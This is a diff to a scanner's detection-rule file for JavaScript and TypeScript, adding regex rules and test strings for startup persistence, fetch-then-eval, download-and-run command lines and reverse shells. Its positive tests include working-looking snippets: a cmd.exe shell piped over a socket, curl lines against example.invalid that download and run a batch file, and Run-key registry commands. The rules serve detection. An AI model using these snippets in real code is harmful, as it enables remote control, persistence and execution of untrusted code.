+        - "const https = await import('node:https');"
+        - "require('dns').resolve(label + '.collector.example', () => {});"
+        - "const { lookup } = require('dns');\nlookup(h, cb);"
+        - "require('tls').connect(443, h);"
+        - "require('dgram').createSocket('udp4');"
+        - "import { createConnection } from 'net';\ncreateConnection(port, host);"
+        - "new (require('net').Socket)();"
       negative:
         - "const data = await loadFromCache(key);"
+        - "import { createServer } from 'node:http';\ncreateServer(app).listen(port);"
+        - "import http from 'node:http';\nhttp.createServer(app).listen(port);"
+        - "import { Socket } from 'node:net';\nexport function peer(s: Socket) { return s.remoteAddress; }"
         - "if (url.startsWith('http')) { open(url); }"
         - "// fetch the record from the database"
 
@@ -421,15 +821,58 @@ rules:
         - 'systemctl[ \t]{1,4}(?:--user[ \t]{1,4})?enable\b'
         - 'WantedBy=(?:default|multi-user)\.target'
         - 'CurrentVersion\\\\Run'
+        # The Windows Startup folder, written whole or joined from parts (review 98: an extension
+        # copying a batch file there on activation).
+        - '(?i:start[ _]menu[\x22\x27\\\\/ ,]{1,8}programs[\x22\x27\\\\/ ,]{1,8}startup\b)'
+        - '(?i:shell:startup\b)'
     tests:
       positive:
         - "fs.appendFileSync(home + '/.bashrc', line);"
         - "execSync('crontab -l | ...');"
         - "const dir = path.join(home, '.config', 'systemd', 'user');"
         - "execSync(`systemctl --user enable ${name}.service`);"
+        - "path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')"
       negative:
         - "const profile = await loadUserProfile(id);"
         - "logger.info('service started');"
+
+  - id: CAP.JS.AUTOSTART.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: persist
+    title: Registers something to start at login or boot
+    message: >
+      This file names a place the operating system starts programs from on its own: the Windows
+      Startup folder, a Run key or a scheduled task, a macOS LaunchAgent, a crontab, or a systemd
+      unit it enables. A shell profile is not one of these -- completion installers append to
+      .bashrc -- but each of these runs its entry with nobody asking.
+    remediation: Confirm the user asked for something to run at every login or boot.
+    provenance:
+      kind: research
+      reference: An editor extension copying a batch file into the Startup folder on activation (review 98).
+    languages: [javascript, typescript]
+    match:
+      kind: regex
+      patterns:
+        - '(?i:start[ _]menu[\x22\x27\\\\/ ,]{1,8}programs[\x22\x27\\\\/ ,]{1,8}startup\b)'
+        - '(?i:shell:startup\b)'
+        - 'CurrentVersion\\\\{1,2}Run(?:Once)?\b'
+        - '(?i:\bschtasks(?:\.exe)?\b[^\n]{0,80}/create\b)'
+        - 'Library[/\\\x22\x27 ,]{1,8}LaunchAgents|/Library/LaunchDaemons'
+        - '(?<![\w-])crontab\b(?!-)[^\n]{0,40}(?:\s-\s?[\x22\x27`]|\|)|/etc/cron\.d/'
+        - 'systemctl[ \t]{1,4}(?:--user[ \t]{1,4})?enable\b'
+    tests:
+      positive:
+        - "path.join(home, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')"
+        - "execSync('reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v x /d y')"
+        - "const plist = path.join(os.homedir(), 'Library', 'LaunchAgents', 'com.x.plist');"
+        - "execSync(`(crontab -l; echo '@reboot node x') | crontab -`);"
+      negative:
+        - "fs.appendFileSync(path.join(os.homedir(), '.bashrc'), completion);"
+        - "const startup = performance.now();"
+        - "// crontab-style schedule parser"
 
   # ---------------------------------------------------------------------
   # Fetch-execute adjacency
@@ -512,11 +955,16 @@ rules:
         - '\b(?:fetch|axios(?:\s{0,4}\.\s{0,4}\w{1,10})?|https?\s{0,4}\.\s{0,4}get)\s{0,4}\([^;]{0,200}\)\s{0,4}\.\s{0,4}then\s{0,4}\([^)\n]{0,60}=>[\s\S]{0,200}?(?:eval|new\s{1,4}Function)\s{0,4}\('
         - '\bnew\s{1,4}Function\s{0,4}\(\s{0,4}(?:await\s{1,4})?(?:[A-Za-z_$][\w$]{0,40}\s{0,4}\.\s{0,4}){0,4}(?:fetch|get|request)\b'
         - '\bchild_process\s{0,4}\.\s{0,4}exec\w{0,8}\s{0,4}\(\s{0,4}(?:await\s{1,4})?[^)\n]{0,80}\b(?:fetch|axios|request)\b'
+        # A response kept in a variable and handed to an evaluator a few statements on -- the
+        # patterns above stop at the first `;`. `axios_1.default.get(src)` is how TypeScript
+        # compiles `axios.get(src)`: `const s = response.data.Cookie; new Function("require", s)`.
+        - '\b(?:axios(?:_\d{1,3})?(?:\s{0,4}\.\s{0,4}default)?\s{0,4}\.\s{0,4}(?:get|post|request)|fetch|https?\s{0,4}\.\s{0,4}get)\s{0,4}\([\s\S]{0,600}?\b(?:new\s{1,4}Function|eval)\s{0,4}\('
     tests:
       positive:
         - "eval(await fetch(url).then(r => r.text()))"
         - "new Function(await fetch(u))()"
         - "fetch(u).then(r => eval(r))"
+        - "const response = await axios_1.default.get(src, { headers });\nconst s = response.data.Cookie;\nconst handler = new Function('require', s);\nhandler(require);"
       negative:
         - "const data = await fetch(url); render(data)"
         - "eval(localConfig)"
@@ -576,6 +1024,75 @@ rules:
         - "JSON.parse(text)"
         - "structuredClone(obj)"
 
+  - id: CAP.JS.COMMAND_FETCH_RUN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: A command line that downloads an executable and runs it
+    message: >
+      This file holds a command line that downloads to an executable file and
+      runs it in the same line -- one `&&` later, or after making it
+      executable. Written as a string, it is what the code hands to
+      child_process; what runs is whatever the remote host served.
+    remediation: >
+      Ship the program, or verify the download against a known digest before
+      it runs.
+    languages: [javascript, typescript]
+    baseline_hits: 0
+    match:
+      kind: regex
+      patterns:
+        # Matched inside a string by design: in JavaScript a quoted command line is how
+        # one is written before it reaches exec(). Not a `| sh` install hint, which is
+        # what the quoted-pipeline exception is for -- this is a file written and run.
+        - '\b(?:curl|wget)(?:\.exe)?\s[^\n]{0,300}?\s-o\s[^\n]{0,200}?\.(?:bat|cmd|exe|ps1|vbs|scr)\b[^\n]{0,16}?&&[^\n]{0,80}?\.(?:bat|cmd|exe|ps1|vbs|scr)\b'
+        - '\b(?:curl|wget)\s[^\n]{0,300}?\s-o\s[^\n]{0,200}?&&\s{0,4}chmod\s{1,4}\+x\s[^\n]{0,200}?&&'
+    tests:
+      positive:
+        - "s('curl -s -L https://example.invalid/b -o \"%TEMP%\\\\box.bat\" && \"%TEMP%\\\\box.bat\"')"
+        - "exec('wget -q https://example.invalid/x -o /tmp/x && chmod +x /tmp/x && /tmp/x')"
+      negative:
+        - "console.log('Install: curl -fsSL https://example.invalid/i.sh | sh')"
+        - "exec('curl -s -o out.json https://example.invalid/api && cat out.json')"
+
+  - id: CAP.JS.SHELL_STDIO_JOINED.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: egress
+    title: Joins a shell's input and output to a stream
+    message: >
+      This file names a command shell and pipes a stream into a process's stdin
+      and the process's output back out. A shell whose input and output are a
+      stream is a remote prompt: the address may be a literal, a variable or a
+      setting, and the join is the same.
+    remediation: >
+      No action for this signal alone. Next to a socket it is a reverse shell.
+    languages: [javascript, typescript]
+    baseline_hits: 0
+    match:
+      kind: regex
+      patterns:
+        # A shell named as a string, a raw network socket opened, then both halves of the
+        # join, in either order. The socket is what makes it remote: a remote-development
+        # extension pipes a terminal into a shell it started -- process plumbing, no socket --
+        # and matched before the socket was required (Remote Containers, Codespaces, Azure
+        # Functions). A language server proxied over a socket names no shell.
+        - '["''](?:cmd(?:\.exe)?|(?:/usr)?(?:/bin/)?(?:ba|z|da|k)?sh|powershell(?:\.exe)?|pwsh(?:\.exe)?)["''][\s\S]{0,3000}?(?:new\s{1,4}(?:[\w$]{1,20}\s{0,4}\.\s{0,4})?Socket\s{0,4}\(|\b(?:net|tls)\s{0,4}\.\s{0,4}(?:connect|createConnection)\s{0,4}\((?![^)\n]{0,120}(?:127\.0\.0\.1|localhost|::1)))[\s\S]{0,2000}?(?:\.pipe\(\s{0,4}[A-Za-z_$][\w$]{0,40}\s{0,4}\.\s{0,4}stdin\s{0,4}\)[\s\S]{0,600}?\.std(?:out|err)\s{0,4}\.\s{0,4}pipe\(|\.std(?:out|err)\s{0,4}\.\s{0,4}pipe\([\s\S]{0,600}?\.pipe\(\s{0,4}[A-Za-z_$][\w$]{0,40}\s{0,4}\.\s{0,4}stdin\s{0,4}\))'
+        - '(?:new\s{1,4}(?:[\w$]{1,20}\s{0,4}\.\s{0,4})?Socket\s{0,4}\(|\b(?:net|tls)\s{0,4}\.\s{0,4}(?:connect|createConnection)\s{0,4}\((?![^)\n]{0,120}(?:127\.0\.0\.1|localhost|::1)))[\s\S]{0,3000}?["''](?:cmd(?:\.exe)?|(?:/usr)?(?:/bin/)?(?:ba|z|da|k)?sh|powershell(?:\.exe)?|pwsh(?:\.exe)?)["''][\s\S]{0,2000}?(?:\.pipe\(\s{0,4}[A-Za-z_$][\w$]{0,40}\s{0,4}\.\s{0,4}stdin\s{0,4}\)[\s\S]{0,600}?\.std(?:out|err)\s{0,4}\.\s{0,4}pipe\(|\.std(?:out|err)\s{0,4}\.\s{0,4}pipe\([\s\S]{0,600}?\.pipe\(\s{0,4}[A-Za-z_$][\w$]{0,40}\s{0,4}\.\s{0,4}stdin\s{0,4}\))'
+    tests:
+      positive:
+        - "let s = 'cmd.exe';\nconst p = exec(s);\nconst c = new net.Socket();\nc.connect(port, host, () => {\n  c.pipe(p.stdin);\n  p.stdout.pipe(c);\n});"
+        - "const sock = net.connect(port, host);\nconst sh = spawn('/bin/sh', []);\nsock.on('connect', () => { sh.stdout.pipe(sock); sock.pipe(sh.stdin); });"
+      negative:
+        - "const server = spawn(serverPath, ['--stdio']);\nsocket.pipe(server.stdin);\nserver.stdout.pipe(socket);"
+        - "const child = spawn('sh', ['-c', 'make']);\nchild.stdout.pipe(process.stdout);"
+        - "const p = spawn('/bin/sh', ['-c', cmd]);\np.stdout.pipe(term.stdout);\nterm.stdin.pipe(p.stdin);"
+        - "spawn('powershell.exe', ['/c', r]);\nconst client = net.createConnection({ host: '127.0.0.1', port: p });\ng.stdout.pipe(d), d.pipe(g.stdin);"
+
   - id: CAP.JS.SOCKET_LITERAL.001
     version: 1.0.0
     category: policy
@@ -608,7 +1125,7 @@ rules:
         - '// connect(4444, "127.0.0.1") in the docs'
 
   # ---------------------------------------------------------------------
-  # Resolved by parsing rather than by pattern (requires the ast-js extra)
+  # Resolved by parsing rather than by pattern (Cordon's own JS/TS front end)
   #
   # The same capabilities the CAP.JS.* rules above label, asked as a question
   # about the parsed tree. A byte pattern for `child_process.exec` misses the
@@ -619,11 +1136,9 @@ rules:
   #     const cp = require("child_process");         // cp.execSync(...) does not either
   #     import { spawn as sp } from "child_process";  // sp(...) hides both
   #
-  # The tree-sitter provider resolves the require/import alias back to the
-  # module, so these fire on every spelling and feed the same composites the
-  # regex primitives do. Without the extra installed a JS file is still scanned
-  # by the regex tier; these rules simply add nothing, which the detector
-  # reports as a language without a provider rather than as a clean file.
+  # The front end (`analysis/javascript/front`) resolves the require/import alias
+  # back to the module through real scopes, so these fire on every spelling and
+  # feed the same composites the regex primitives do.
   # ---------------------------------------------------------------------
   - id: CAP.JS.AST.SPAWN.001
     version: 1.0.0
@@ -690,14 +1205,22 @@ rules:
         - vm.compileFunction
         - node:vm.runInThisContext
         - node:vm.runInNewContext
+      # Not when the code is exactly a literal dynamic import of a package name, the idiom that
+      # hides `import()` from a CommonJS build (note 70 D2, with CAP.JS.EXECUTE.001's pattern): the
+      # two tiers read it alike. Any other argument, a built one included, still matches.
+      argument_index: 0
+      argument_excludes: '^\s*[''"`]?import\(\s*\\?[''"][\w@./-]{1,200}\\?[''"]\s*\)[''"`]?\s*$'
     tests:
       positive:
         - "eval(payload);"
         - "const vm = require('vm');\nvm.runInNewContext(code);"
         - "import { runInThisContext } from 'vm';\nrunInThisContext(code);"
+        - "eval('fetch(u).then(r => r.text()).then(eval)');"
+        - "eval('import(' + name + ')');"
       negative:
         - "model.eval();"
         - "const vm = require('vm');\nvm.something(x);"
+        - "const { default: d } = await eval('import(\\'audio-decode\\')');"
 
   - id: CAP.JS.AST.DECODE.001
     version: 1.0.0
